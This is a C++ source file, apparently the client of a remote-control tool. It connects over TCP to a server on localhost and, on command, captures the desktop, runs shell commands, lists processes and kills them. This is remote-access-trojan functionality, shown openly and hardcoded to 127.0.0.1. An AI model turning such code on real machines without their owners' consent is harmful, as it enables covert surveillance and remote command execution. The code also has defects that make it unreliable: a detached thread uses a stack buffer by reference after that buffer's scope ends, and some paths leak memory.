#include "ctcpsocket.h"
#include "DskCapture.h"
#include "MyCmd.h"
#include "CMyProcess.h"
#include "../../common/common.h"
#include <thread>

#pragma comment(lib, "ws2_32.lib")

CTcpSocket::CTcpSocket()
	: m_pCmd(nullptr), m_pProcess(nullptr), m_pDskCapture(nullptr)
{
	
}

CTcpSocket::~CTcpSocket()
{
	//cmd
	if (m_pCmd != nullptr)
	{
		delete m_pCmd;
		m_pCmd = nullptr;
	}
	//process
	if (m_pProcess != nullptr)
	{
		delete m_pProcess;
		m_pProcess = nullptr;
	}
	//desk
	if(m_pDskCapture != nullptr)
	{ 
		delete m_pDskCapture;
		m_pDskCapture = nullptr;
	}

	closesocket(m_ConnectSocket);
}

bool CTcpSocket::StartUp()
{
    WORD wVersionRequested;
    WSADATA wsaData;
    int err;

    wVersionRequested = MAKEWORD(2, 2);

    err = WSAStartup(wVersionRequested, &wsaData);
    if (err != 0) {
        return false;
    }

    return true;
}

bool CTcpSocket::CreateAndConnect(int nPort)
{
    int nRet = 0;
	m_ConnectSocket = socket(AF_INET,
                        SOCK_STREAM,//数据流, 流式
                        IPPROTO_TCP);

    if (m_ConnectSocket == SOCKET_ERROR){
        return false;
    }

	sockaddr_in addr = { 0 };
	//InetPton(AF_INET,
	//	INADDR_ANY, //0.0.0.0
	//	&addr.sin_addr.S_un.S_addr);//INADDR_ANY;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(nPort);
	addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
	DWORD dwIP;


	nRet = connect(m_ConnectSocket, (sockaddr*)&addr, sizeof(sockaddr));
	if (nRet == SOCKET_ERROR) {
		return false;
	}

	//cmd
	m_pCmd = new MyCmd(m_ConnectSocket, nullptr, 0);
	std::thread createCmdThread([&]() {
		m_pCmd->CreateCmd();
	});
	createCmdThread.detach();

	//process
	m_pProcess = new CMyProcess(m_ConnectSocket);

	//desk
	m_pDskCapture = new DskCapture(m_ConnectSocket);

    return true;
}

bool CTcpSocket::RecvThread()
{
	//recv
	char szBuf[1024] = { 0 };
	bool bRet = false;

	std::thread recvThread([&](SOCKET sClient) {
		char* pData = NULL;
		//循环读取数据
		while (true) {
			tagPacket* pkt = (tagPacket*)szBuf;
			//先读包头
			bRet = RecvData(sClient, (char*)pkt, sizeof(tagPacket));
			if (!bRet)
			{
				continue;
			}

			//到这里表示已经成功的读取了包头数据
			if (pkt->length > 0) {
				//收取包的附加数据
				pData = new char[pkt->length];
				memset(pData, 0, pkt->length);
				bool bRet = RecvData(sClient, (char*)pData, pkt->length);
				if (!bRet)
				{
					return;
				}
			}
			
            switch (pkt->code)
			{
                case MSG_SCREEN: //服务端请求查看桌面截屏
				{					
					bSend = true;
					if (bSend)
					{
						m_pDskCapture->ScreenCapture();
					}
				}
				break;

				case MSG_SCREEN_CLOSE:
				{
					bSend = false;//不用再发送数据了
				}
				break;

				case MSG_CMD:
				{
					m_pCmd->SetCmdLine(pData, pkt->length);
				}
				break;

				case MSG_CMD_YES:
				{
					m_pCmd->RecycleCount();
				}
				break;

				case MSG_PROCESS:
				{
					m_pProcess->SendProcess();
				}
				break;

				case MSG_PROCESS_TERMINATE:
				{
					//char* 转 DWORD
					DWORD dwPid = atoi(pData);
					m_pProcess->Terminate(dwPid);
				}
				break;

				default:
					break;
			}

			if (pData != nullptr)
			{
				delete[] pData;
				pData = nullptr;
			}
		}

	}, m_ConnectSocket);

	recvThread.detach();

	return true;
}

bool CTcpSocket::RecvData(SOCKET s, char* pBuf, int nData) {

    int nTotalSize = 0;
    while (nTotalSize < nData) {
        int nRet = recv(s,
            pBuf + nTotalSize,
            nData - nTotalSize,
            0);
        if (nRet > 0) {
            nTotalSize += nRet;
        }
        else {
            return false;
        }
    }

    return true;
}

SSIZE_T written(SOCKET s, const char *ptr, size_t n)
{
	size_t nleft;
	SSIZE_T nwritten;

	nleft = n;
	while (nleft > 0)
	{
		if ((nwritten = send(s, (char *)ptr, nleft, 0)) < 0) {
			if (nleft == n) {
				return (-1); /* error, return -1 */
			} 
			else {
				break; /* error, return amount written so far */
			}	
		}
		else if (nwritten == 0) {
			break;
		}
		nleft -= nwritten;
		ptr += nwritten;
	}
	return (n - nleft); /* return >= 0 */
}

bool CTcpSocket::SendBitmap(char *pBuf, int nSize)
{
	//缓冲区（包头长度+数据长度）
	char* pSendBuf = new char[sizeof(tagPacket) + nSize];
	if (pSendBuf == nullptr)
	{
		return false;
	}

	//组包
	tagPacket *pkt = (tagPacket*)pSendBuf;
    pkt->code = MSG_SCREEN;  //消息类型
    pkt->length = nSize;                //数据长度
	if (nSize > 0)
	{
		//移动指针（tagPacket）长度，拷贝数据
		memcpy(pSendBuf + sizeof(tagPacket), pBuf, nSize);
	}

	//循环发送数据，可参考UNP的written
	int n = written(m_ConnectSocket, pSendBuf, nSize + sizeof(tagPacket));

	//释放资源
	if (pSendBuf != nullptr)
	{
		delete [] pSendBuf;
	}
	//不管释放没释放，到这里pSendBuf都不再有效
	pSendBuf = nullptr;
	
	return true;
}


int CTcpSocket::Send(SOCKET s, char *pData, int nLength)
{
    return send(s, pData, nLength, 0);
}

int CTcpSocket::Recv(SOCKET s, char *pData, int nLength)
{
    return recv(s, pData, nLength, 0);
}

bool CTcpSocket::Close(SOCKET s)
{
    closesocket(s);

    return true;
}